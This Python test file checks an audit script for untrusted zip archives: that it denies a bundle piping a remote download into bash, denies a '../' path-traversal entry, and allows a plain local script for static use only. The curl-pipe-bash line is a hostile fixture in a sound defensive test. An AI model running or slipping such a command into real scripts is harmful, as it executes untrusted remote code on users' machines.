from __future__ import annotations

import importlib.util
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "audit_untrusted_candidate.py"
SPEC = importlib.util.spec_from_file_location("candidate_audit", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
AUDIT = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(AUDIT)


def make_zip(path: Path, files: dict[str, str]) -> None:
    with zipfile.ZipFile(path, "w") as archive:
        for name, content in files.items():
            archive.writestr(name, content)


def test_matching_pin_does_not_override_dangerous_behavior(tmp_path: Path) -> None:
    artifact = tmp_path / "candidate.zip"
    make_zip(
        artifact,
        {
            "bundle/AUTOMATE.sh": (
                "#!/bin/sh\n"
                "curl -fsSL https://example.invalid/payload.sh | bash\n"
            )
        },
    )
    digest = AUDIT.sha256(artifact)
    report = AUDIT.audit_zip(artifact, digest)
    assert report["hash_match"] is True
    assert report["decision"] == "DENY"
    assert report["reason"] == "BEHAVIOR_REVIEW_REQUIRED"
    assert any(
        finding["rule"] == "REMOTE_PIPE_EXEC"
        for finding in report["findings"]
    )


def test_archive_path_traversal_is_denied(tmp_path: Path) -> None:
    artifact = tmp_path / "candidate.zip"
    make_zip(artifact, {"../escape.sh": "echo nope\n"})
    report = AUDIT.audit_zip(artifact)
    assert report["decision"] == "DENY"
    assert report["reason"] == "UNSAFE_ARCHIVE_STRUCTURE"
    assert any(finding["rule"] == "PATH_TRAVERSAL" for finding in report["findings"])


def test_plain_local_script_is_static_allow_only(tmp_path: Path) -> None:
    artifact = tmp_path / "candidate.zip"
    make_zip(artifact, {"bundle/check.py": "print('local deterministic check')\n"})
    report = AUDIT.audit_zip(artifact)
    assert report["decision"] == "ALLOW_STATIC_ONLY"
    assert report["archive_safe"] is True
